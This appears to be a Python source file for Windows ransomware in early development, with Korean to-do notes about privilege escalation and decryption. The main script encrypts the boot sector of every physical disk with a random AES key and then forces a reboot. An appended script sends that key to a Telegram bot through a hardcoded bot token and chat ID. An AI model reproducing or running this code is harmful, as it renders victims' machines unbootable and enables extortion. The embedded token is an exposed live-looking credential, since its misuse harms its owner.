import os
from os import urandom  # urandom: random number generator (by windows operating system)
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes  # Cipher: encryption and decryption class, algorithms: encryption and decryption algorithms for cipher object, modes: CBC, CTR...
from cryptography.hazmat.backends import default_backend
import subprocess

# 클래스, 객체, 인스턴스, 메소드 
# rsa 코드, 관리자 권한 함수 추가
# 챗 봇 코드 구현 (디랙토리 연동 공부)
# 복호화 코드 구현
# 무차별 대입 공격

# Function: search physical disk
def search_disk():
    disk_count = 0
    while True:
        disk_path = r"\\.\PhysicalDrive{}".format(disk_count)  # r: raw, \\.\: windows operating system physical disk
        try:
            with open(disk_path, 'rb'):  # open physical disk (rb: read binary)
                disk_count += 1
        except PermissionError:  # permission error (not admin)
            # 관리자 권한 실행 유도 코드 추가
            disk_count += 1
        except FileNotFoundError:  # no physical disk error
            break
    return disk_count

# Function: read disk data & call disk encrypt function
def read_encrypt_write_disk(disk_number, key, IV):
    disk_path = r"\\.\PhysicalDrive{}".format(disk_number)  # r: raw, \\.\: windows operating system physical disk
    try:
        with open(disk_path, 'r+b') as disk:  # open physical disk (r+b: read & write binary) (open file handle name: disk)
            sector_data = disk.read(512)  # read 512-Byte data (.read(size): read data size-Byte)
            encrypt_and_write_back_sector_data(disk, sector_data, key, IV)  # function call: encrypt_and_write_back_sector_data()
            print(f"Physical Disk {disk_number} Sector 0 Encrypted and Written Back.")
    except PermissionError as e:  # permission error (not admin)
        # 관리자 권한 실행 유도 코드 추가
        print(f"Cannot open physical disk {disk_number}. Permission denied: {e}")
    except FileNotFoundError as e:  # no physical disk error
        print(f"Cannot open physical disk {disk_number}. Disk not found: {e}")
        # break ???

# Function: disk encrypt & write encrypt data
def encrypt_and_write_back_sector_data(disk, sector_data, key, IV):
    cipher = Cipher(algorithms.AES(key), modes.CTR(IV), backend=default_backend())  # create cipher object from Chipher class
    encryptor = cipher.encryptor()  # .encryptor(): encryption method of cipher object
    encrypted_data = encryptor.update(sector_data) + encryptor.finalize()  # .update(): data encryption method, .finalize(): data encryption finalization method
    disk.seek(0)  # start 0-Byte (.seek(size): start size-Byte (movement data start pointer))
    disk.write(encrypted_data)  # write encrypted data to disk

# function: wait seconds (cmd)
def wait_in_cmd(seconds):
    subprocess.call(f'timeout /t {seconds} /nobreak', shell=True)  # subprocess.call(): block process until the command completes function (print from shell)
    # timeout /t "time value": waiting for "time value" seconds ("automatically rotates cursor to previous cursor"), /nobreak: prevent exit cmd window by pressing key, shell=True: print from shell)

# function: system restart
def restart_computer():
    os.system("shutdown /r /t 1")  # system restart (os.system(shutdown): shutdown base command of windows operating system) (+ /r: system restart option)

# main
if __name__ == '__main__':
    disk_count = search_disk()  # function call: search_disk
    if disk_count == 0:
        print("No physical disks found.")
        wait_in_cmd(30)  # wait 30 seconds (cmd)
    else:
        key = urandom(32)  # AES-256 key value (32-Byte)
        IV = urandom(16)  # AES-256 IV value (16-Byte)
        oneKey = key + IV  # AES-256 combine key value (48-Byte)

        print("Key:", ''.join(f"{b:02X}" for b in key))  # print each Byte of key value to Hex 
        print("IV:", ''.join(f"{b:02X}" for b in IV))  # print each Byte of IV value to Hex 
        print("oneKey:", ''.join(f"{b:02X}" for b in oneKey))  # print each Byte of oneKey value to Hex 

        print(f"Number of physical disks found: {disk_count}")
        for disk_number in range(disk_count):
            read_encrypt_write_disk(disk_number, key, IV)  # function call: read_encrypt_write_disk()
        wait_in_cmd(30)  # wait 30 seconds (cmd)
        restart_computer()  # system restart

        # subprocess.run(['python3', 'chatBot.py', 'oneKey'])












import asyncio
import telegram as tel
import sys

async def send_message():
    bot = tel.Bot(token="6345282020:AAE4Z_7L9islIhFbBfkMcY3Sa5m2ZkrvxJE")
    chat_id = 6478368513
    await bot.send_message(chat_id=chat_id, text=sys.argv[1])

asyncio.run(send_message())  # Python 3.7 이상을 사용하고 있다면 asyncio.run으로 비동기 함수를 실행합니다.
